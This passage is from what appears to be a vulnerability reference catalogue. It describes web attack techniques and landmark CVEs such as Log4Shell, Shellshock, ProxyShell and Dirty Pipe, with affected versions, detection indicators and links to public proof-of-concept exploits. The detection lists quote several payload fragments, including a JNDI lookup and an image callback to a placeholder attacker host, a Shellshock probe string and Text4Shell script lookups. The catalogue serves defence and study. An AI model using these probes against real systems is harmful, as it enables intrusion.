**References:** [link](https://github.com/visma-prodsec/confused) · [link](https://github.com/dsp-testing/dependency-confusion) · [link](https://medium.com/@alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610) · [link](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/)


## Unique / niche techniques (`unique-technique`)

### PHP Filter Chain LFI-to-RCE (Synacktiv)
*id:* `php-filter-chain-lfi2rce` · *severity:* **critical** · *languages:* php

Synacktiv's php://filter chaining technique turns any file-read include/require primitive into arbitrary code execution with no file upload by stacking character-encoding conversion filters to generate a chosen PHP payload byte-by-byte from an empty/known stream.

**How it works —** By composing many iconv/convert.* filters on a php://filter chain, each conversion nudges the produced bytes toward an attacker-chosen string, so the include ultimately parses generated PHP even when the attacker cannot write a file anywhere. Tooling (Synacktiv's php_filter_chain_generator) builds the chain automatically; blind-oracle variants and prefix/suffix control (wrapwrap-style) extend it to file leaks. Payload size (~a few KB in headers) is the main constraint. Conceptual only.

**Where —** Any include/require/file_get_contents sink where the attacker fully controls the wrapper-capable path parameter, including modern apps lacking a writable directory.

**Detection indicators:**
- Long php://filter chains with many convert.iconv.* / convert.base64 segments in a path parameter
- Include parameters accepting the php:// scheme
- Large expanding request parameters feeding a file-inclusion sink
- Errors from iconv/stream filters on malformed chains

**References:** [link](https://github.com/synacktiv/php_filter_chain_generator) · [link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html) · [link](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) · [link](https://archives.pass-the-salt.org/Pass%20the%20SALT/2023/slides/PTS2023-Talk-16-php_filter_chains.pdf)

### GraphQL Batching / Aliasing Rate-Limit Bypass
*id:* `graphql-batching-attacks` · *severity:* **high** · *languages:* graphql

GraphQL's ability to run many operations or aliased fields in one HTTP request lets attackers pack hundreds of login/OTP/coupon attempts into a single request, defeating per-request rate limiting and enabling brute force, 2FA bypass, and resource-exhaustion DoS.

**How it works —** Because query batching (arrays of operations) and field aliasing let a single POST resolve the same mutation many times, external rate limiters counting HTTP requests see one request while the server processes many attempts. This bypasses login throttling, brute-forces OTP/coupon spaces, and can be combined with expensive nested queries for DoS. Mitigation is per-operation limits and disabling batching for sensitive fields. Conceptual only.

**Where —** GraphQL APIs exposing login/OTP/password-reset/coupon mutations without operation-level rate limiting, and endpoints allowing arbitrary aliasing/batched arrays.

**Detection indicators:**
- POST bodies containing arrays of operations or many aliased duplicates of one field/mutation
- Rate limits enforced only per HTTP request rather than per operation
- Sensitive mutations (login, verifyOtp) reachable via aliases
- Large single requests producing many backend auth attempts

**References:** [link](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass) · [link](https://hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html) · [link](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/) · [link](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

### SVG Upload Stored XSS
*id:* `svg-xss` · *severity:* **high** · *languages:* svg, xml, javascript · *CVE:* CVE-2022-31022

SVG is XML parsed by the browser's HTML/JS engine, so an uploaded SVG served inline from a stateful origin can carry script, event handlers, foreignObject-embedded HTML, javascript: links, and XML entities, yielding stored XSS and XXE.

**How it works —** The SVG spec permits script elements, on-event handlers (onload, etc.), foreignObject with embedded HTML/iframes, animate/xlink:href external references, and CDATA-wrapped script; when a site accepts SVG uploads and serves them with an image or inline content type from an origin holding session state, each file becomes a stored XSS payload executing as the victim. foreignObject helps bypass naive string filters and some CSP setups; DOCTYPE entities add XXE. Fix: sanitize/rasterize or serve from a sandboxed origin with a safe content type. Conceptual only.

**Where —** Avatar/logo/document uploaders that accept image/svg+xml and later render it inline on a session-bearing domain.

**Detection indicators:**
- Uploaded SVGs served with content type image/svg+xml on the main origin
- SVG markup containing script, on* handlers, foreignObject, or xlink:href
- DOCTYPE/ENTITY declarations inside uploaded SVG
- Reflected SVG rendered inline rather than as a downloaded/attachment resource

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) · [link](https://hackerone.com/reports/1276742) · [link](https://github.com/Squidex/squidex/security/advisories/GHSA-xfr4-qg2v-7v5m)

### CSS Injection Data Exfiltration
*id:* `css-injection-exfiltration` · *severity:* **medium** · *languages:* css, html

Even without JavaScript, injected CSS can exfiltrate data using attribute selectors and background-image requests to leak input values, CSRF tokens, and (with :has/:not and newer functions) arbitrary text nodes and attributes character-by-character.

**How it works —** Attribute selectors like input[value^='a'] paired with a background request fire only when a prefix matches, so an attacker leaks a secret one character at a time; recursive/font-ligature and :has()/:not() techniques extend this to blind pages and text nodes, and inline-style exfiltration (attr()/image-set() conditionals) works even where only style attributes are allowed and CSP blocks script. PortSwigger's blind-CSS-exfiltration research generalises it to unknown pages. Conceptual only.

**Where —** Sites permitting user-controlled CSS/style (HTML email, markdown/rich-text, themes) or with HTML-injection where CSP blocks JS but styles are allowed.

**Detection indicators:**
- Injected style/link/@import reflected in rendered pages
- Attribute selectors with ^=, $=, *= combined with url()/image-set() requests
- Outbound background-image/font requests correlated with secret values
- Use of :has()/:not() probes against form or token elements

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection) · [link](https://github.com/PortSwigger/css-exfiltration) · [link](https://portswigger.net/research/blind-css-exfiltration) · [link](https://portswigger.net/research/inline-style-exfiltration)


## Landmark CVEs (`famous-cve`)

### Citrix Bleed
*id:* `citrix-bleed` · *severity:* **critical** · *languages:* c · *CVE:* CVE-2023-4966

Buffer over-read in NetScaler ADC/Gateway (Gateway or AAA virtual server) leaks memory including valid session tokens, letting an unauthenticated attacker hijack authenticated sessions and bypass MFA. Exploited by ransomware groups.

**How it works —** conceptual

**Where —** Citrix NetScaler ADC/Gateway configured as VPN/ICA Proxy/CVPN/RDP Proxy or AAA vserver, versions before 14.1-8.50, 13.1-49.15, 13.0-92.19; patched Oct 10 2023.

**Detection indicators:**
- Internet-facing Citrix NetScaler Gateway / AAA login portal
- NetScaler build/version string below the patched releases
- Large/anomalous responses to crafted requests to the login endpoint (memory disclosure)
- Session reuse from unexpected geolocations / hijacked NSC_AAAC tokens in logs

**References:** [link](https://github.com/assetnote/exploits/tree/main/citrix/CVE-2023-4966) · [link](https://github.com/Chocapikk/CVE-2023-4966) · [link](https://nvd.nist.gov/vuln/detail/CVE-2023-4966) · [link](https://www.cisa.gov/guidance-addressing-citrix-netscaler-adc-and-gateway-vulnerability-cve-2023-4966-citrix-bleed) · [link](https://unit42.paloaltonetworks.com/threat-brief-cve-2023-4966-netscaler-citrix-bleed/)

### EternalBlue (MS17-010)
*id:* `eternalblue` · *severity:* **critical** · *languages:* c, assembly · *CVE:* CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0147, CVE-2017-0148

Buffer overflow in Microsoft SMBv1 handling of specially crafted packets allows unauthenticated remote code execution as SYSTEM. Leaked NSA exploit weaponized by WannaCry and NotPetya worms.

**How it works —** conceptual

**Where —** SMBv1 on Windows XP through Windows Server 2016 before the March 2017 MS17-010 patch. Exploited via TCP/445.

**Detection indicators:**
- Open TCP/445 with SMBv1 dialect negotiated
- Unpatched Windows (missing MS17-010 KB) in banner/patch inventory
- nmap smb-vuln-ms17-010 script or Metasploit auxiliary scanner flagging the host
- SMB Trans2/anonymous IPC$ probes returning STATUS_INSUFF_SERVER_RESOURCES

**References:** [link](https://github.com/worawit/MS17-010) · [link](https://github.com/3ndG4me/AutoBlue-MS17-010) · [link](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) · [link](https://nvd.nist.gov/vuln/detail/CVE-2017-0144) · [link](https://www.exploit-db.com/exploits/42030)

### Log4Shell
*id:* `log4shell` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2021-44228, CVE-2021-45046, CVE-2021-45105

Unauthenticated RCE in Apache Log4j 2 via JNDI lookup: a logged string containing ${jndi:ldap://attacker/x} causes Log4j to resolve and load a remote Java class, executing attacker code. CVSS 10.0.

**How it works —** conceptual

**Where —** Apache Log4j 2.0-beta9 through 2.14.1 (message lookup substitution enabled); fixed in 2.15.0 (2.16.0/2.17.0 for follow-ups). Ubiquitous in Java web apps, ES, Struts, VMware, etc.

**Detection indicators:**
- Java apps that log user-controlled input (User-Agent, X-Forwarded-For, form fields, hostnames)
- Outbound LDAP/RMI/DNS callbacks to attacker infra after injecting a JNDI probe string
- jar manifests / dependency trees listing log4j-core 2.x < 2.15.0
- WAF/log signatures containing ${jndi:, ${lower:, ${env: nested obfuscation

**References:** [link](https://github.com/kozmer/log4j-shell-poc) · [link](https://github.com/marcourbano/CVE-2021-44228) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) · [link](https://logging.apache.org/log4j/2.x/security.html) · [link](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) · [link](https://www.rapid7.com/blog/post/ra-cve-2021-44228-log4shell-analysis/)

### ProxyLogon
*id:* `proxylogon` · *severity:* **critical** · *languages:* c#, .net · *CVE:* CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065

Pre-auth SSRF in Exchange (/ecp/proxyLogon.ecp / autodiscover) lets an attacker authenticate as the Exchange server, chained with a post-auth arbitrary file write to drop a web shell for unauthenticated RCE. Exploited en masse by HAFNIUM.

**How it works —** conceptual

**Where —** On-premises Microsoft Exchange Server 2013/2016/2019 before the March 2021 (KB5000871) patches. Exploited over HTTPS/443.

**Detection indicators:**
- On-prem Exchange OWA/ECP exposed to the internet (autodiscover, /ecp, /owa)
- POST requests to /ecp/proxyLogon.ecp or Autodiscover with crafted X-BEResource cookies
- Newly written .aspx web shells under Exchange front-end / aspnet_client directories
- Unusual OABGeneratorLog / ECP server-side request forgery entries in IIS logs

**References:** [link](https://github.com/praetorian-inc/proxylogon-exploit) · [link](https://github.com/p0wershe11/ProxyLogon) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-26855) · [link](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) · [link](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-26855.html)

### ProxyShell
*id:* `proxyshell` · *severity:* **critical** · *languages:* c#, .net · *CVE:* CVE-2021-34473, CVE-2021-34523, CVE-2021-31207

Chain of three Exchange bugs (pre-auth path confusion via Autodiscover Explicit LogonURL, PowerShell backend privilege elevation, and arbitrary file write via mailbox export) achieving unauthenticated RCE. Disclosed by Orange Tsai (DEVCORE).

**How it works —** conceptual

**Where —** On-premises Microsoft Exchange 2013 CU23-, 2016 CU20/CU21-, 2019 CU9/CU10- before the April/May 2021 patches (KB5001779, KB5003435). Exploited over HTTPS/443.

**Detection indicators:**
- On-prem Exchange with Autodiscover / mapi / PowerShell endpoints reachable
- URLs containing /autodiscover/autodiscover.json?...&Email=autodiscover/... with an X-Rps-CAT / Email path-confusion payload
- New-MailboxExportRequest activity dropping .aspx web shells to accessible paths
- IIS logs showing requests to /powershell with elevated backend SID

**References:** [link](https://github.com/horizon3ai/proxyshell) · [link](https://github.com/dmaasland/proxyshell-poc) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-34473) · [link](https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers) · [link](https://www.rapid7.com/blog/post/2021/08/12/proxyshell-more-widespread-exploitation-of-microsoft-exchange-servers/)

### Shellshock (Bash Bug)
*id:* `shellshock` · *severity:* **critical** · *languages:* c, bash · *CVE:* CVE-2014-6271, CVE-2014-7169, CVE-2014-6277, CVE-2014-6278, CVE-2014-7186, CVE-2014-7187

GNU Bash evaluates trailing commands appended to function definitions exported through environment variables. Any vector that sets env vars from attacker input (CGI, DHCP, SSH ForceCommand) yields remote code execution.

**How it works —** conceptual

**Where —** GNU Bash <= 4.3 across Linux/Unix/macOS; primary remote vector is Apache mod_cgi/CGI scripts that spawn bash. Patched incompletely by first fix, hence CVE-2014-7169 and follow-ups.

**Detection indicators:**
- CGI endpoints (/cgi-bin/*, .sh, .cgi) reachable over HTTP
- Injecting () { :;}; <cmd> into HTTP headers (User-Agent, Cookie, Referer) triggering command execution
- Test string env x='() { :;}; echo vulnerable' bash -c 'echo test' printing 'vulnerable'
- Out-of-band DNS/HTTP callback from the target after a header-based probe

**References:** [link](https://github.com/opsxcq/exploit-CVE-2014-6271) · [link](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/) · [link](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) · [link](https://access.redhat.com/security/vulnerabilities/shellshock) · [link](https://www.cisa.gov/news-events/alerts/2014/09/25/gnu-bourne-again-shell-bash-shellshock-vulnerability-cve-2014-6271-cve-2014-7169-cve-2014-7186-cve)

### Spring4Shell
*id:* `spring4shell` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2022-22965

Data-binding flaw in Spring Framework on JDK 9+ lets an attacker manipulate ClassLoader properties (class.module.classLoader...) via crafted request parameters to write a malicious JSP web shell, yielding RCE.

**How it works —** conceptual

**Where —** Spring Framework < 5.2.20 and < 5.3.18, running as a Tomcat WAR deployment on JDK 9+ using Spring MVC/WebFlux with @RequestMapping POJO binding. Fixed in 5.2.20/5.3.18.

**Detection indicators:**
- Java Spring MVC/WebFlux app deployed as a WAR on Tomcat with JDK 9+
- POST requests containing class.module.classLoader / class.classLoader parameters
- Suspicious Tomcat logging valve config or newly written .jsp files in webroot
- spring-core / spring-beans versions below the patched releases in dependency inventory

**References:** [link](https://github.com/jakabakos/CVE-2022-22965-Spring4Shell) · [link](https://github.com/BobTheShoplifter/Spring4Shell-POC) · [link](https://nvd.nist.gov/vuln/detail/CVE-2022-22965) · [link](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement) · [link](https://github.com/advisories/GHSA-36p3-wjmg-h94x)

### Apache Struts 2 OGNL RCE (S2-045)
*id:* `struts2-ognl-s2-045` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2017-5638

The Jakarta Multipart parser mishandles a malformed Content-Type header, evaluating an embedded OGNL expression during error handling, giving unauthenticated remote command execution. Root cause of the 2017 Equifax breach.

**How it works —** conceptual

**Where —** Apache Struts 2.3.5-2.3.31 and 2.5-2.5.10; fixed in 2.3.32 / 2.5.10.1 (advisory S2-045, also S2-046). Any Struts 2 app accepting file uploads.

**Detection indicators:**
- Java web app built on Apache Struts 2 (*.action / *.do endpoints)
- HTTP requests with a malformed Content-Type header containing %{...} OGNL such as #cmd=/#cmds= and multipart/form-data prefix
- Web server executing shell commands (whoami/id) right after a request with an anomalous Content-Type
- Struts JAR version below the patched releases in dependency inventory

**References:** [link](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_content_type_ognl.rb) · [link](https://www.rapid7.com/db/vulnerabilities/apache-struts-cve-2017-5638/) · [link](https://nvd.nist.gov/vuln/detail/CVE-2017-5638) · [link](https://cwiki.apache.org/confluence/display/WW/S2-045) · [link](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html)

### XZ Utils Backdoor
*id:* `xz-backdoor` · *severity:* **critical** · *languages:* c, shell, m4 · *CVE:* CVE-2024-3094

A multi-year social-engineering supply-chain attack planted a backdoor in liblzma (XZ Utils) build tarballs. When linked into sshd via systemd, it hooks RSA_public_decrypt to run attacker commands from a specially signed key, giving pre-auth RCE. Caught by Andres Freund via a 500ms SSH latency anomaly.

**How it works —** conceptual

**Where —** XZ Utils / liblzma 5.6.0 and 5.6.1 release tarballs, primarily on x86-64 glibc Linux with systemd-linked OpenSSH (Debian sid, Fedora rawhide/40 beta, etc.); caught before wide stable rollout, March 2024.

**Detection indicators:**
- xz/liblzma package version 5.6.0 or 5.6.1 present on the host
- sshd startup showing abnormal latency (~500ms) or unexpected liblzma symbol resolution
- IFUNC hook redirecting RSA_public_decrypt in the sshd process image
- Presence of the malicious injected object extracted from test/ fixture files during build

**References:** [link](https://github.com/amlweems/xzbot) · [link](https://github.com/karcherm/xz-malware) · [link](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) · [link](https://www.openwall.com/lists/oss-security/2024/03/29/4) · [link](https://securitylabs.datadoghq.com/articles/xz-backdoor-cve-2024-3094/) · [link](https://en.wikipedia.org/wiki/XZ_Utils_backdoor)

### Dirty COW
*id:* `dirty-cow` · *severity:* **high** · *languages:* c · *CVE:* CVE-2016-5195

Race condition in the Linux kernel copy-on-write (COW) handling of private read-only memory mappings lets an unprivileged local user gain write access to read-only files (e.g. /etc/passwd, setuid binaries), yielding local privilege escalation to root.

**How it works —** conceptual

**Where —** Linux kernel 2.6.22 (2007) through pre-4.8.3 / 4.7.9 / 4.4.26; fixed Oct 2016. Broad impact including Android.

**Detection indicators:**
- Local low-priv shell on a Linux host with an unpatched kernel (uname -r before the distro's fix)
- Distro kernel package version predating the October 2016 patch
- Unexpected writes to root-owned read-only files / modified /etc/passwd or setuid binaries in forensic review

**References:** [link](https://github.com/dirtycow/dirtycow.github.io) · [link](https://github.com/firefart/dirtycow) · [link](https://github.com/scumjr/dirtycow-vdso) · [link](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) · [link](https://dirtycow.ninja/) · [link](https://access.redhat.com/security/cve/cve-2016-5195)

### Dirty Pipe
*id:* `dirty-pipe` · *severity:* **high** · *languages:* c · *CVE:* CVE-2022-0847

Uninitialized pipe_buffer flags (PIPE_BUF_FLAG_CAN_MERGE) let an unprivileged process overwrite data in the page cache backing read-only files, enabling arbitrary read-only file overwrite and local privilege escalation to root. Conceptually similar to Dirty COW but easier.

**How it works —** conceptual

**Where —** Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101; fixed Feb/Mar 2022. Affects servers, containers and Android devices on those kernels.

**Detection indicators:**
- Local shell on a Linux host running kernel 5.8-5.16.x without the fix (uname -r)
- Container escapes / privilege gains without needing write permission on the target file
- Modified setuid binaries or /etc/passwd with an unexpected injected root entry

**References:** [link](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit) · [link](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) · [link](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) · [link](https://dirtypipe.cm4all.com/) · [link](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847)

### Follina (MSDT)
*id:* `follina` · *severity:* **high** · *languages:* xml, powershell · *CVE:* CVE-2022-30190

Office documents can invoke the ms-msdt: URL protocol handler to pass a crafted PowerShell payload to the Microsoft Support Diagnostic Tool, executing code with no macros required, even from preview/RTF.

**How it works —** conceptual

**Where —** Microsoft Windows MSDT via Office (Word) using a remote OOXML/RTF template; exploited May 2022, patched in the June 14 2022 cumulative update. Also mitigable by unregistering the ms-msdt handler.

**Detection indicators:**
- Office documents fetching a remote HTML template (word/_rels referencing an external http(s) URL)
- HTML/URL payloads containing ms-msdt:/id PCWDiagnostic with IT_BrowseForFile / $(cmd) parameters
- winword.exe spawning msdt.exe then sdiagnhost.exe / powershell.exe (unusual process chain)
- RTF files that trigger without opening (Explorer preview pane) reaching out to attacker infra

**References:** [link](https://github.com/JohnHammond/msdt-follina) · [link](https://github.com/chvancooten/follina.py) · [link](https://nvd.nist.gov/vuln/detail/CVE-2022-30190) · [link](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190) · [link](https://www.rapid7.com/blog/post/2022/05/31/cve-2022-30190-follina-microsoft-support-diagnostic-tool-vulnerability/)

### Ghostcat
*id:* `ghostcat` · *severity:* **high** · *languages:* java · *CVE:* CVE-2020-1938

Apache Tomcat's AJP connector trusts client-supplied request attributes, letting an attacker read arbitrary files under the webapp (WEB-INF/web.xml, config, source) and, if file upload exists, process an uploaded file as JSP for RCE.

**How it works —** conceptual

**Where —** Apache Tomcat 6.x/7.x/8.x/9.x with the AJP connector (default on TCP/8009); fixed in 9.0.31, 8.5.51, 7.0.100. Also tracked as CNVD-2020-10487.

**Detection indicators:**
- Open TCP/8009 (AJP13 connector) reachable from the network
- Tomcat version banner below the patched releases
- AJP requests setting javax.servlet.include.* attributes to read WEB-INF/META-INF files
- Retrieval of web.xml / application source via crafted AJP file-inclusion requests

**References:** [link](https://github.com/abrewer251/CVE-2020-1938_Ghostcat-PoC) · [link](https://www.exploit-db.com/exploits/48143) · [link](https://nvd.nist.gov/vuln/detail/CVE-2020-1938) · [link](https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487) · [link](https://www.trendmicro.com/en_us/research/20/c/busting-ghostcat-an-analysis-of-the-apache-tomcat-vulnerability-cve-2020-1938-and-cnvd-2020-10487.html)

### Heartbleed
*id:* `heartbleed` · *severity:* **high** · *languages:* c · *CVE:* CVE-2014-0160

Missing bounds check in OpenSSL's TLS/DTLS Heartbeat (RFC 6520) lets an attacker request more bytes back than supplied, leaking up to 64KB of process memory per request (keys, session cookies, credentials). Information disclosure, no auth.

**How it works —** conceptual

**Where —** OpenSSL 1.0.1 through 1.0.1f (and 1.0.2-beta); fixed in 1.0.1g. Affected any TLS service linking the vulnerable libssl (HTTPS, SMTP/IMAP STARTTLS, OpenVPN, etc.).

**Detection indicators:**
- TLS services advertising the heartbeat extension in the ServerHello
- Server banner / package version showing OpenSSL 1.0.1-1.0.1f
- Malformed heartbeat response returning far more data than the payload length sent
- filippo.io/Heartbleed or nmap ssl-heartbleed script flagging the host

**References:** [link](https://github.com/sensepost/heartbleed-poc) · [link](https://github.com/mpgn/heartbleed-PoC) · [link](https://nvd.nist.gov/vuln/detail/CVE-2014-0160) · [link](https://heartbleed.com/) · [link](https://www.openssl.org/news/secadv/20140407.txt) · [link](https://www.cisa.gov/news-events/alerts/2014/04/08/openssl-heartbleed-vulnerability-cve-2014-0160)

### ImageTragick
*id:* `imagetragick` · *severity:* **high** · *languages:* c · *CVE:* CVE-2016-3714

ImageMagick insufficiently sanitizes filenames/URLs passed to delegate (external command) coders, so shell metacharacters embedded in a crafted image (e.g. MVG/MSL/HTTPS coder) execute arbitrary OS commands during image conversion.

**How it works —** conceptual

**Where —** ImageMagick before 6.9.3-10 / 7.0.1-1; affects any web service that processes user-uploaded images with vulnerable coders (EPHEMERAL, HTTPS, MVG, MSL, TEXT, SHOW, WIN, PLT) enabled.

**Detection indicators:**
- Web apps that accept and convert/resize user-uploaded images (avatars, thumbnails)
- Uploads with image magic bytes but MVG/MSL content invoking url()/system delegates
- Out-of-band DNS/HTTP callback after uploading a crafted image (fill 'url(https://attacker/x)')
- policy.xml not disabling the vulnerable coders; ImageMagick version below the patch

**References:** [link](https://github.com/ImageTragick/PoCs) · [link](https://www.exploit-db.com/exploits/39767) · [link](https://nvd.nist.gov/vuln/detail/CVE-2016-3714) · [link](https://imagetragick.com/) · [link](https://access.redhat.com/security/vulnerabilities/ImageTragick)

### PwnKit
*id:* `pwnkit` · *severity:* **high** · *languages:* c · *CVE:* CVE-2021-4034

Out-of-bounds write in polkit's pkexec argument handling (argc==0) lets an unprivileged local user reintroduce an insecure environment variable (e.g. via GCONV_PATH/LD) and execute code as root. Present ~12 years, trivially exploitable.

**How it works —** conceptual

**Where —** polkit pkexec (SUID-root) since 2009 on all major Linux distros (Ubuntu, Debian, Fedora, CentOS) until the Jan 2022 patch.

**Detection indicators:**
- Local shell on Linux with a SUID pkexec present (/usr/bin/pkexec)
- polkit package version predating the January 2022 fix
- No preconditions needed - default installs are affected regardless of polkit daemon state
- Audit logs showing pkexec invoked with a manipulated GCONV_PATH/charset environment

**References:** [link](https://github.com/arthepsy/CVE-2021-4034) · [link](https://github.com/berdav/CVE-2021-4034) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) · [link](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) · [link](https://access.redhat.com/security/vulnerabilities/RHSB-2022-001)

### regreSSHion
*id:* `regresshion` · *severity:* **high** · *languages:* c · *CVE:* CVE-2024-6387

Signal-handler race condition in OpenSSH sshd: if a client does not authenticate within LoginGraceTime, the async SIGALRM handler calls non-async-signal-safe functions (e.g. syslog), which can be raced to achieve unauthenticated RCE as root. A regression reintroducing CVE-2006-5051.

**How it works —** conceptual

**Where —** OpenSSH sshd on glibc-based Linux: versions 8.5p1 through 9.7p1 vulnerable (also < 4.4p1 unless patched for the old CVE); fixed in 9.8p1 (July 2024). Exploitation is difficult (thousands of attempts, ASLR bypass).

**Detection indicators:**
- Internet-facing sshd banner (SSH-2.0-OpenSSH_8.5 - 9.7) on glibc Linux
- OpenSSH package version in the vulnerable range
- Repeated connections holding open past LoginGraceTime without authenticating (race attempts)
- Sshd crashes / segfaults in logs consistent with race exploitation attempts

**References:** [link](https://github.com/zgzhang/cve-2024-6387-poc) · [link](https://github.com/xonoxitron/regreSSHion) · [link](https://nvd.nist.gov/vuln/detail/CVE-2024-6387) · [link](https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server) · [link](https://www.qualys.com/regresshion-cve-2024-6387)

### Sudo Baron Samedit
*id:* `sudo-baron-samedit` · *severity:* **high** · *languages:* c · *CVE:* CVE-2021-3156

Heap-based buffer overflow in sudo's command-line argument parsing (unescaped backslash in shell/sudoedit mode) allows any local user, even one not in sudoers, to escalate to root.

**How it works —** conceptual

**Where —** sudo 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1 in default configuration; fixed in 1.9.5p1 patched build (Jan 2021).

**Detection indicators:**
- Local shell on a host with a vulnerable sudo version (sudo --version)
- Test: sudoedit -s '\' followed by a long string returns a segmentation fault instead of a usage error
- Distro sudo package predating the January 2021 fix
- No sudoers membership required - even the 'nobody' account can trigger it

**References:** [link](https://github.com/blasty/CVE-2021-3156) · [link](https://github.com/worawit/CVE-2021-3156) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-3156) · [link](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit) · [link](https://access.redhat.com/security/cve/cve-2021-3156)

### Text4Shell
*id:* `text4shell` · *severity:* **high** · *languages:* java · *CVE:* CVE-2022-42889

Apache Commons Text StringSubstitutor default interpolators include script:, dns:, and url: lookups; interpolating attacker-controlled input (e.g. ${script:javascript:...}) executes arbitrary code, yielding RCE.

**How it works —** conceptual

**Where —** Apache Commons Text 1.5 through 1.9 when untrusted input reaches StringSubstitutor.createInterpolator(); fixed in 1.10.0 (default lookups restricted).

**Detection indicators:**
- Java apps depending on commons-text 1.5-1.9 in the dependency tree
- User-controlled data reaching interpolation (search fields, params) containing ${script:, ${dns:, ${url:
- Out-of-band DNS/HTTP callback from ${dns:address|attacker} or ${url:...} probes
- RCE indicators after submitting ${script:javascript:java.lang.Runtime...} style payloads

**References:** [link](https://github.com/kljunowsky/CVE-2022-42889-text4shell) · [link](https://github.com/securekomodo/text4shell-poc) · [link](https://nvd.nist.gov/vuln/detail/CVE-2022-42889) · [link](https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/) · [link](https://www.zscaler.com/blogs/security-research/security-advisory-apache-commons-text-remote-code-execution-vulnerability)

